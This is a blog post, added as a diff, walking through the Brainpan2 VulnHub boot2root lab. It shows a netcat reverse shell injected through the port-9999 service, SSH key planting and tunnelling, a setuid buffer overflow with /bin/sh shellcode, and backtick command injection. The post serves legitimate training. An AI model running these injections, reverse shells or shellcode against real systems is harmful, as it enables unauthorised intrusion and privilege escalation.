@@ -1,0 +1,686 @@
+---
+layout: post
+title: "Brainpan2"
+date: "2013-11-20"
+comments: true
+categories: 
+ - security
+ - hacking
+ - wargames
+ - brainpan
+---
+
+{% img left /images/brainpan.jpg %}
+
+Over on #vulnhub, there has been quite a chatter about [Brainpan2](http://vulnhub.com/entry/brainpan_2,56/), a "sequel" to Brainpan, by [superkojiman](https://twitter.com/@superkojiman). They're even offering a 50 GBP award to whoever submits the best write-up! Since I enjoy challenges like this, I took a look at the machine. However, the writeup had to wait until the contest was complete, so that people didn't cheat to win.
+
+<!-- more -->
+
+<div style="clear:both;"></div>
+
+## The trolling, it begins early...
+
+I imported the VM into VMWare Fusion, and started finding the host.
+
+{% img /images/brainpan2_vmware_booted.png %}
+
+The first thing I had to do, was find it's IP. Many people use 'netdiscover', but I typically prefer just ping sweeping often. It can sometimes miss, but it works well for me.
+
+```
+➜  ~  nmap -sP 192.168.188.0/24
+
+Starting Nmap 6.40 ( http://nmap.org ) at 2013-11-20 16:19 EST
+Nmap scan report for 192.168.188.1
+Host is up (0.00046s latency).
+Nmap scan report for 192.168.188.146
+Host is up (0.00061s latency).
+Nmap done: 256 IP addresses (2 hosts up) scanned in 3.14 seconds
+```
+
+From this, I now know the IP is 192.168.188.146 on my network, but will vary for each person playing this game.
+
+Next, I did a basic nmap scan to discover what services were on the machine.
+
+```
+➜  ~  nmap -sV 192.168.188.146
+
+Starting Nmap 6.40 ( http://nmap.org ) at 2013-11-20 16:20 EST
+Nmap scan report for 192.168.188.146
+Host is up (0.0017s latency).
+Not shown: 998 closed ports
+PORT      STATE SERVICE VERSION
+9999/tcp  open  abyss?
+10000/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.3)
+
+Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 37.38 seconds
+```
+
+This looked eerily similar to the original Brainpan vulnerable machine. Due to that, I started to attack it in a similar method. I ran 'dirb' on the web server to see if there were any hidden files.
+
+```
+➜  dirb  ./dirb http://192.168.188.146:10000 wordlists/big.txt -S
+
+-----------------
+DIRB v2.03
+By The Dark Raver
+-----------------
+
+START_TIME: Wed Nov 20 16:22:36 2013
+URL_BASE: http://192.168.188.146:10000/
+WORDLIST_FILES: wordlists/big.txt
+OPTION: Silent Mode
+
+-----------------
+
+GENERATED WORDS: 4217
+
+---- Scanning URL: http://192.168.188.146:10000/ ----
++ http://192.168.188.146:10000//
+    (FOUND: 200 [Ok] - Size: 204)
++ http://192.168.188.146:10000/bin
+    (FOUND: 301 [Moved Permanently] - Size: 0)
+
+-----------------
+DOWNLOADED: 4217 - FOUND: 2
+```
+
+Again, just like the previous challenge, there was a 'bin' folder. I browsed to it, and saw a 'brainpan.exe'. I had to double-check that I had downloaded the proper boot2root again!
+
+{% img /images/brainpan2_firefox_bin_directory.png %}
+
+I downloaded the file, and looked to see if it was still a Portable Executable, only to discover it was actually a JPEG.
+
+```
+➜  ~  wget http://192.168.188.146:10000/bin/brainpan.exe
+--2013-11-20 16:25:15--  http://192.168.188.146:10000/bin/brainpan.exe
+Connecting to 192.168.188.146:10000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 18764 (18K) [application/x-msdos-program]
+Saving to: ‘brainpan.exe’
+
+100%[======================================>] 18,764      --.-K/s   in 0.001s
+
+2013-11-20 16:25:15 (16.7 MB/s) - ‘brainpan.exe’ saved [18764/18764]
+
+➜  ~  file brainpan.exe
+brainpan.exe: JPEG image data, JFIF standard 1.01, comment: "CREATOR: gd-jpeg v1.0 (using IJ"
+```
+
+I renamed the file to have a JPEG extension, and opened it, only to see that I'd been trolled. I can sense a theme for this challenge...
+
+{% img /images/brainpan2_preview.png %}
+
+## Getting down to business
+
+Since the webserver seemed to be a dead end, I connected to the server on port 9999. It looked to be a terminal application that I could play with. I logged in as GUEST, and looked around to see the commands it would allow.
+
+```
+➜  ~  nc 192.168.188.146 9999
+_|                            _|
+_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|
+_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
+_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
+_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
+                                            _|
+                                            _|
+
+[______________________ WELCOME TO BRAINPAN 2.0________________________]
+                             LOGIN AS GUEST
+
+                          >> GUEST
+                          ACCESS GRANTED
+
+
+                             *  *  *  *
+    THIS APPLICATION IS WORK IN PROGRESS. GUEST ACCESS IS RESTRICTED.
+    TYPE "TELL ME MORE" FOR A LIST OF COMMANDS.
+                             *  *  *  *
+
+
+                          >> TELL ME MORE
+    FILES    HELP    VIEW       CREATE
+    USERS    MSG     SYSTEM     BYE
+```
+
+I found that if I ran the 'FILES' command, it would show me a file listing.
+```
+
+                          >> FILES
+total 36
+-rwxr-xr-x 1 root   root   18424 Nov  4 15:17 brainpan.exe
+-rw-r--r-- 1 root   root    1109 Nov  5 09:24 brainpan.txt
+-rw-r--r-- 1 root   root     683 Nov  4 12:14 notes.txt
+-rw-r--r-- 1 anansi anansi    12 Nov  5 09:16 test-1
+-rwxrwxrwx 1 anansi anansi    19 Nov  5 09:16 test-2
+```
+
+If I then used the 'VIEW' command, I could read those files.
+
+```
+-rwxrwxrwx 1 anansi anansi    19 Nov  5 09:16 test-2
+                          >> VIEW
+    ENTER FILE TO DOWNLOAD: test-2
+File create works.
+```
+
+After tinkering, I found that the 'VIEW' command, would let me inject code, if I just prepended my commands with a semi-colon. It wasn't sanitizing the input very well. 
+
+I setup a local listener on my MacBook (192.168.1.136).
+
+```
+➜  ~  nc -lv 1234
+```
+
+I then issued the 'VIEW' command, and injected a connect-back command through netcat.
+
+```
+                          >> VIEW
+    ENTER FILE TO DOWNLOAD: ; /bin/nc.traditional -e /bin/sh 192.168.1.136 1234
+```
+
+The window just froze, so I went back to my netcat window to verify it was working. I issued the 'id' command to test it. It was in fact working, and showed that I was able to execute commands as 'anansi'.
+
+```
+id
+uid=1000(anansi) gid=1000(anansi) groups=1000(anansi),50(staff)
+```
+
+I really wanted to upgrade this shell to a 'real' shell, like over SSH, but the port scan before didn't show SSH running. On a hunch, I ran 'netstat', and I found the SSH server running on the '127.0.1.1' host, on port 2222. Checking the /etc/ssh/sshd_config file verified this configuration, albeit a bit odd. 
+
+```
+netstat -antup
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+tcp        0      0 127.0.1.1:2222          0.0.0.0:*               LISTEN      -
+tcp        0      0 0.0.0.0:9999            0.0.0.0:*               LISTEN      5382/brainpan.exe
+tcp        0      0 0.0.0.0:10000           0.0.0.0:*               LISTEN      -
+tcp        0      0 192.168.188.146:50562   192.168.1.136:1234      ESTABLISHED 5522/sh
+tcp        0      0 192.168.188.146:9999    192.168.188.1:52622     ESTABLISHED 5382/brainpan.exe
+udp        0      0 0.0.0.0:68              0.0.0.0:*                           -
+udp        0      0 0.0.0.0:7240            0.0.0.0:*                           -
+udp6       0      0 :::59406                :::*                                -
+```
+
+I added my MacBook's public key to the machine for the username 'anansi', since I didn't know the password. But first, I had to do a trick that [g0tmi1k](https://twitter.com/@g0tmi1k) taught me to get a 'proper' shell (the python).
+
+```
+python -c 'import pty;pty.spawn("/bin/bash")'
+anansi@brainpan2:/opt/brainpan$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7lycUor/c861GeARol7mufaGiXdWEi1NdR2F1iNJKr/2SwbkpBnmsKr+2ko8wk+x2KQzPHkNNNoTO3BUsc1BvInyLlTqmi9L3EjVBxmeprKVIUX/2jLC4wh1V4UVSODU+DCzu1OiNfFos1Tto28p/ZA6mTPm4WrcH5rFTpnzUagS+4EpuPlBjOOCIjL2cphpFV+TvbbFrWyGtB9LIDXajx9Dw5wsyI7SyCIwpgG9zBzg2WuYf5OQcKcSB+OgEzXy2tWTT4og98EI4A26FZ9EdvvwJATQ3gvkmGKh913PvU3528gDt7R5DnkaCHt6hVCaa9JOR5b/W9DCCDGjcw31j mandreko@420-sc02j364hdkq5-man" > ~/.ssh/authorized_keys
+anansi@brainpan2:/opt/brainpan$ chmod 600 ~/.ssh/authorized_keys
+```
+
+Now, I just had to figure out a way to access the '127.0.1.1:2222' port from my MacBook, so I could get a real SSH connection. I managed to use a reverse SSH tunnel to complete this.
+
+```
+anansi@brainpan2:/opt/brainpan$ ssh mandreko@192.168.1.136 -R 9876:127.0.1.1:2222
+<pan$ ssh mandreko@192.168.1.136 -R 9876:127.0.1.1:2222
+Password:<redacted>
+
+Last login: Wed Nov 20 16:44:34 2013
+```
+
+Now, in a third terminal window, I was able to SSH in.
+
+```
+➜  ~  ssh anansi@localhost -p 9876
+Linux brainpan2 3.2.0-4-686-pae #1 SMP Debian 3.2.51-1 i686
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Tue Nov  5 09:13:28 2013
+anansi@brainpan2:~$
+```
+
+I figured the next step would be to escalate my privileges, so I started looking for programs that were SetUID, meaning that when they ran, they ran under the privileges of the user that owned them. I found one, in another user's home folder, which I was conveniently able to view.
+
+```
+anansi@brainpan2:~$ find / -perm -u=s -type f 2>/dev/null
+/usr/sbin/exim4
+/usr/bin/chfn
+/usr/bin/passwd
+/usr/bin/chsh
+/usr/bin/procmail
+/usr/bin/gpasswd
+/usr/bin/at
+/usr/bin/newgrp
+/usr/lib/pt_chown
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/bin/umount
+/bin/ping
+/bin/mount
+/bin/ping6
+/bin/su
+/home/reynard/msg_root
+anansi@brainpan2:~$ cd /home/reynard
+anansi@brainpan2:/home/reynard$ ls -al
+total 44
+drwxr-xr-x 3 reynard reynard 4096 Nov  7 09:54 .
+drwxr-xr-x 5 root    root    4096 Nov  4 10:57 ..
+-rw------- 1 reynard reynard    0 Nov  7 09:54 .bash_history
+-rw-r--r-- 1 reynard reynard  220 Nov  4 10:57 .bash_logout
+-rw-r--r-- 1 reynard reynard 3392 Nov  4 10:57 .bashrc
+-rwsr-xr-x 1 root    root    8999 Nov  6 17:10 msg_root
+-rw-r--r-- 1 reynard reynard  675 Nov  4 10:57 .profile
+-rw-r--r-- 1 reynard reynard  154 Nov  5 23:20 readme.txt
+-rwxr-xr-x 1 reynard reynard  137 Nov  4 19:59 startweb.sh
+drwxr-xr-x 3 reynard reynard 4096 Nov  4 19:32 web
+```
+
+I read the 'readme.txt' file, and attempted to use the tool as it was designed first. It seemed to work.
+
+```
+anansi@brainpan2:/home/reynard$ cat readme.txt
+msg_root is a quick way to send a message to the root user.
+Messages are written to /tmp/msg.txt
+
+usage:
+msg_root "username" "this message is for root"
+anansi@brainpan2:/home/reynard$ ./msg_root "test" "test"
+Your message is test
+anansi@brainpan2:/home/reynard$ cat /tmp/msg.txt
+test: test
+```
+
+I figured the next step would be to try to overflow one of the buffers. I tried the first argument first, and it crashed.
+
+```
+anansi@brainpan2:/home/reynard$ ./msg_root $(perl -e 'print "A"x100') hi
+Segmentation fault
+```
+
+In a temporary terminal on my MacBook, I ran Metasploit's 'pattern_create.rb', to create a unique pattern.
+
+```
+➜  tools git:(master) ✗ ./pattern_create.rb 100
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
+```
+
+I then used this as the first argument, to get the address that overwrote the EIP.
+
+```
+anansi@brainpan2:/home/reynard$ gdb ./msg_root --quiet
+Reading symbols from /home/reynard/msg_root...done.
+(gdb) run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A hi
+Starting program: /home/reynard/msg_root Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A hi
+
+Program received signal SIGSEGV, Segmentation fault.
+0x35614134 in ?? ()
+```
+
+In the temporary terminal, I then plugged the value into the 'pattern_offset.rb' tool to find the offset to the EIP. It turns out it was quite short, only 14 bytes.
+
+```
+➜  tools git:(master) ✗ ./pattern_offset.rb 0x35614134
+[*] Exact match at offset 14
+```
+
+To verify this, I setup a skeleton command to run as an exploit. I was able to verify that 14 bytes were in fact the offset, since the "B"x4 showed up as 0x42424242, their hex equivilent.
+
+```
+(gdb) run $(perl -e 'print "A"x14 . "B"x4 . "C"x100') hi
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+
+Starting program: /home/reynard/msg_root $(perl -e 'print "A"x14 . "B"x4 . "C"x100') hi
+
+Program received signal SIGSEGV, Segmentation fault.
+0x42424242 in ?? ()
+```
+
+I figured the next two steps were to find an address to return to, be it a 'jmp esp', or something useful. Since this was a local linux application, however, I found I could just put the shellcode in memory as an environment variable, and then jump directly to the address. I started off by finding some shellcode I'd used in the past, which would run /bin/sh, and setting it to an environment variable with a little NOP sled.
+
+```
+anansi@brainpan2:/home/reynard$ export SHELLCODE=$(perl -e 'print "\x90"x32 . "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"')
+```
+
+All I needed now was to find the address of this environmental variable. I used a tool from 'Hacking: The Art of Exploitation', one of my favorite books for this stuff. Since there was no 'gcc' on Brainpan2, I had to compile the tool on a local linux machine (I used a Kali VM), and then download it to the Brainpan VM.
+
+```
+root@kali:~# cat > getenvaddr.c << EOF
+> #include <stdio.h>
+> #include <stdlib.h>
+> #include <string.h>
+> 
+> int main(int argc, char *argv[]) {
+>         char *ptr;
+>         if(argc < 3) {
+>                 printf("Usage: %s <environment var> <target program name>\n", argv[0]);
+>                 exit(0);
+>         }
+> 
+>         ptr = getenv(argv[1]); /* Get env var location. */
+>         ptr += (strlen(argv[0]) - strlen(argv[2]))*2; /* Adjust for program name. */
+>         printf("%s will be at %p\n", argv[1], ptr);
+> }
+> EOF
+root@kali:~# gcc -o getenvaddr getenvaddr.c 
+root@kali:~# mv getenvaddr /var/www
+root@kali:~# service apache2 start
+[....] Starting web server: apache2apache2: Could not reliably determine the server's fully qualified domain name, using 127.0.1.1 for ServerName
+. ok 
+root@kali:~# ifconfig eth0
+eth0      Link encap:Ethernet  HWaddr 00:0c:29:0d:d8:41  
+          inet addr:192.168.188.138  Bcast:192.168.188.255  Mask:255.255.255.0
+          inet6 addr: fe80::20c:29ff:fe0d:d841/64 Scope:Link
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:17 errors:16 dropped:0 overruns:0 frame:0
+          TX packets:28 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:2033 (1.9 KiB)  TX bytes:2370 (2.3 KiB)
+          Interrupt:19 Base address:0x2024 
+```
+
+```
+anansi@brainpan2:/home/reynard$ wget http://192.168.188.138/getenvaddr -O /tmp/getenvaddr
+--2013-11-20 17:16:26--  http://192.168.188.138/getenvaddr
+Connecting to 192.168.188.138:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 5336 (5.2K)
+Saving to: `/tmp/getenvaddr'
+
+100%[=========================================================================>] 5,336       --.-K/s   in 0s
+
+2013-11-20 17:16:26 (582 MB/s) - `/tmp/getenvaddr' saved [5336/5336]
+anansi@brainpan2:/home/reynard$ chmod +x /tmp/getenvaddr
+```
+
+After saving the file to a temp directory, I executed it, to give me the address of 'SHELLCODE' in memory.
+
+```
+anansi@brainpan2:/home/reynard$ /tmp/getenvaddr SHELLCODE ./msg_root
+SHELLCODE will be at 0xbffff91a
+```
+
+I then plugged the value into my skeleton exploit, and ran it.
+
+```
+anansi@brainpan2:/home/reynard$ ./msg_root $(perl -e 'print "A"x14 . "\x1a\xf9\xff\xbf"') hi
+$ id
+uid=1000(anansi) gid=1000(anansi) euid=104(root) groups=106(root),50(staff),1000(anansi)
+```
+
+At this point, I saw that I was 'root', and prepared to gloat about my victory in #vulnhub. I however missed one thing. 
+
+## The fake out
+
+If you look really carefully at the 'id' command, you'll see that the euid is '104', and the groupid is '106'. This is not the norm, as 'root' is usually '0' and '0'. I also noticed that my prompt was still '$', versus the usual '#' root prompt. I however, went along my way. I went to '/root', to see if there was some sort of flag, or something fun like are often found in these challenges. I saw there indeed was one, so I tried to read it.
+
+```
+$ cd /root
+$ ls -al
+total 28
+drwx------  3 root  root  4096 Nov  5 09:56 .
+drwxr-xr-x 22 root  root  4096 Nov  5 07:09 ..
+drwx------  2 root  root  4096 Nov  4 10:08 .aptitude
+-rw-------  1 root  root     0 Nov  5 09:57 .bash_history
+-rw-r--r--  1 root  root   589 Nov  5 09:56 .bashrc
+-rw-r--r--  1 root  root   159 Nov  5 09:56 .profile
+-rw-------  1 root  root   461 Nov  5 09:48 flag.txt
+-rw-------  1 root  root   245 Nov  5 09:47 whatif.txt
+$ cat flag.txt
+cat: flag.txt: Permission denied
+```
+
+The 'Permission denied' really confused me for a minute. How was it that the 'root' user, the most god-like user on a UNIX system, would be unable to read a text file? I next read the 'whatif.txt' file.
+
+```
+$ cat whatif.txt
+
+       WHAT IF I TOLD YOU
+              ___
+            /     \
+           | ______\
+          (, \_/ \_/
+           |   ._. |
+           \   --- /
+           /`-.__.'
+      .---'`-.___|\___
+     /                `.
+
+       YOU ARE NOT ROOT?
+
+```
+
+This is yet another troll from [superkojiman](https://twitter.com/@superkojiman), who is a complete bastard. Going on this information, I decided to check out the system password file to see what was up.
+
+```
+$ cat /etc/passwd
+root:x:104:106:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/bin/sh
+man:x:6:12:man:/var/cache/man:/bin/sh
+lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+mail:x:8:8:mail:/var/mail:/bin/sh
+news:x:9:9:news:/var/spool/news:/bin/sh
+uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+proxy:x:13:13:proxy:/bin:/bin/sh
+www-data:x:33:33:www-data:/var/www:/bin/sh
+backup:x:34:34:backup:/var/backups:/bin/sh
+root :x:0:0:root:/var/root:/bin/bash
+list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+Debian-exim:x:101:103::/var/spool/exim4:/bin/false
+statd:x:102:65534::/var/lib/nfs:/bin/false
+sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin
+anansi:x:1000:1000:anansi,,,:/home/anansi:/bin/bash
+puck:x:1001:1001:puck,,,:/home/puck:/bin/bash
+reynard:x:1002:1002:reynard,,,:/home/reynard:/bin/bash
+```
+
+The one thing that stood out to me, was that I was using the 'root' user, but the original 'root' user had been renamed to 'root ' (notice the space at the end). This was also the same point that my brain almost shut down.
+
+Figuring I'd have to escalate yet again, I looked around for more SetUID binaries.
+
+```
+$ find / -perm -u=s -type f 2>/dev/null
+/opt/old/brainpan-1.8/brainpan-1.8.exe
+/usr/sbin/exim4
+/usr/bin/chfn
+/usr/bin/passwd
+/usr/bin/chsh
+/usr/bin/procmail
+/usr/bin/gpasswd
+/usr/bin/at
+/usr/bin/newgrp
+/usr/lib/pt_chown
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/bin/umount
+/bin/ping
+/bin/mount
+/bin/ping6
+/bin/su
+/home/reynard/msg_root
+```
+
+This time around, there was a new binary, '/opt/old/brainpan-1.8/brainpan-1.8.exe'. I went into the folder, and poked around to see what else was there.
+
+```
+$ cd /opt/old/brainpan-1.8
+$ ls -al
+total 36
+drwxrwxr-x 2 root  staff  4096 Nov  5 09:25 .
+drwx------ 3 root  root   4096 Nov  4 10:28 ..
+-rwsr-xr-x 1 puck  puck  17734 Nov  4 14:37 brainpan-1.8.exe
+-rw-r--r-- 1 puck  puck   1227 Nov  5 09:24 brainpan.7
+-rw-rw-rw- 1 puck  staff    27 Nov  5 09:25 brainpan.cfg
+```
+
+Remembering back to when I was logged into the initial terminal application, I had read in the 'notes.txt' file, that version 1.8 was playing with reading in a config from a file, but that was scrapped in the 1.9 version that I had been using. This older version though, still had it. I read the 'brainpan.cfg' file, to see that it would only run locally. I however wanted it to run on the public interface, so I could access it in a fourth terminal window conveniently. I modified the configuration, and started the service.
+
+```
+$ echo "port=9333\nipaddr=0.0.0.0" > brainpan.cfg
+$ cat brainpan.cfg
+port=9333
+ipaddr=0.0.0.0
+$ ./brainpan-1.8.exe
+port = 9333
+ipaddr = 0.0.0.0
++ bind done
++ waiting for connections...
+
+```
+
+I opened a fourth terminal window on my MacBook, and connected to the service. It looked very similar to the newer version, however most of the commands wouldn't work.
+
+```
+➜  ~  nc 192.168.188.146 9333
+_|                            _|
+_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|
+_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
+_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
+_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
+                                            _|
+                                            _|
+
+[______________________ WELCOME TO BRAINPAN 1.8________________________]
+                             LOGIN AS GUEST
+
+                          >> GUEST
+                          ACCESS GRANTED
+
+
+                             *  *  *  *
+    THIS APPLICATION IS WORK IN PROGRESS. GUEST ACCESS IS RESTRICTED.
+    TYPE "TELL ME MORE" FOR A LIST OF COMMANDS.
+                             *  *  *  *
+
+
+                          >> TELL ME MORE
+    FILES    HELP    VIEW       CREATE
+    USERS    MSG     SYSTEM     BYE
+
+                          >> FILES
+    WHAT?
+                          >> HELP
+    WHAT?
+                          >> CREATE
+    WHAT?
+                          >> USERS
+    NOT YET SUPPORTED
+                          >> MSG
+    NOT YET SUPPORTED
+                          >> SYSTEM
+    NOT AVAILABLE TO GUEST ACCOUNT
+```
+
+The only one that seemed to work, was 'VIEW'. I tried to exploit it the same was as before, but it just hung the application.
+
+```
+                          >> VIEW
+    ENTER FILE TO DOWNLOAD: ; ls
+```
+
+I played around a bit, and noticed that if I used backticks, I could execute some code, and it appeared to display the output to my screen. I figured I'd try to add my SSH public key again to see if it worked.
+
+```
+                          >> VIEW
+    ENTER FILE TO DOWNLOAD: `echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7lycUor/c861GeARol7mufaGiXdWEi1NdR2F1iNJKr/2SwbkpBnmsKr+2ko8wk+x2KQzPHkNNNoTO3BUsc1BvInyLlTqmi9L3EjVBxmeprKVIUX/2jLC4wh1V4UVSODU+DCzu1OiNfFos1Tto28p/ZA6mTPm4WrcH5rFTpnzUagS+4EpuPlBjOOCIjL2cphpFV+TvbbFrWyGtB9LIDXajx9Dw5wsyI7SyCIwpgG9zBzg2WuYf5OQcKcSB+OgEzXy2tWTT4og98EI4A26FZ9EdvvwJATQ3gvkmGKh913PvU3528gDt7R5DnkaCHt6hVCaa9JOR5b/W9DCCDGjcw31j mandreko@420-sc02j364hdkq5-man" > /home/puck/.ssh/authorized_keys;chmod 600 /home/puck/.ssh/authorized_keys`
+```
+
+It again hung, but when I attempted to login in a fifth terminal screen, it worked like a charm.
+
+```
+➜  ~  ssh puck@localhost -p 9876
+Linux brainpan2 3.2.0-4-686-pae #1 SMP Debian 3.2.51-1 i686
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+puck@brainpan2:~$
+```
+
+## Always secure your backups
+
+I figured, based on the trolling, I'd find yet another program to exploit. However, I saw no files in the home directory for 'puck'. When I looked at hidden files, I found all of the normal files you'd expect, plus a '.backup' folder.
+
+```
+puck@brainpan2:~$ ls -al
+total 28
+drwx------ 4 puck  puck  4096 Nov  5 09:45 .
+drwxr-xr-x 5 root  root  4096 Nov  4 10:57 ..
+drwxr-xr-x 3 puck  puck  4096 Nov  5 09:44 .backup
+-rw------- 1 puck  puck     0 Nov  5 09:28 .bash_history
+-rw-r--r-- 1 puck  puck   220 Nov  4 10:54 .bash_logout
+-rw-r--r-- 1 puck  puck  3392 Nov  4 10:54 .bashrc
+-rw-r--r-- 1 puck  puck   675 Nov  4 10:54 .profile
+drwx------ 2 puck  puck  4096 Nov 20 17:35 .ssh
+```
+
+I started reading through all the files, especially the '.bash_history'. It looks like normal commands. He even would ssh locally when he'd do things as 'root', since 'sudo' wasn't installed. I figured that I would try doing the same, to see if his key was in the 'authorized_keys' file for the 'root' user. No dice, it didn't work and was asking me for a password.
+
+```
+puck@brainpan2:~$ ssh root@127.0.1.1 -p2222
+The authenticity of host '[127.0.1.1]:2222 ([127.0.1.1]:2222)' can't be established.
+ECDSA key fingerprint is 0a:15:1c:1c:25:b0:fe:54:8a:35:45:e5:b8:02:97:1a.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added '[127.0.1.1]:2222' (ECDSA) to the list of known hosts.
+root@127.0.1.1's password:
+```
+
+In the .backup folder, there were backups of all the files in the home folder for 'puck'. However, when I was reading through them, I noticed that the .id_rsa keys were not the same between his live files, and backup files.
+
+```
+puck@brainpan2:~$ diff -q ~/.ssh/id_rsa ~/.backup/.ssh/id_rsa
+Files /home/puck/.ssh/id_rsa and /home/puck/.backup/.ssh/id_rsa differ
+```
+
+I tried using this backup key to ssh as root, and it worked!
+
+```
+puck@brainpan2:~$ ssh -l "root " brainpan2 -p2222 -i ~/.backup/.ssh/id_rsa
+Linux brainpan2 3.2.0-4-686-pae #1 SMP Debian 3.2.51-1 i686
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Thu Nov  7 11:00:06 2013
+root @brainpan2:~# id
+uid=0(root ) gid=0(root ) groups=0(root )
+```
+
+I was actually the 'root ' (with a space) user this time. I then read the 'flag.txt' file, with a grin.
+
+```
+root @brainpan2:~# cat /root/flag.txt
+
+                          !!! CONGRATULATIONS !!!
+
+                 You've completed the Brainpan 2 challenge!
+                 Or have you...?
+
+                 Yes, you have! Pat yourself on the back. :-)
+
+                 Questions, comments, suggestions for new VM
+                 challenges? Let me know!
+
+
+                 Twitter: @superkojiman
+                 Email  : contact@techorganic.com
+                 Web    : http://www.techorganic.com
+
+```
+
+## Conclusion
+
+After talking with [superkojiman](https://twitter.com/@superkojiman), I find out that I did at least a couple of the challenges in ways he didn't design. The last part of the challenge was actually supposed to be an exploit-dev challenge, but I managed to find my own path. I may have to return to this challenge to try it the proper way now.
+
+Thanks [superkojiman](https://twitter.com/@superkojiman) for an awesome boot2root. Thanks [g0tmi1k](https://twitter.com/@g0tmi1k) for hosting [VulnHub](http://vulnhub.com/). I really enjoyed playing this game, and appreciate the work that everyone puts into the individual challenges, as well as the site itself.
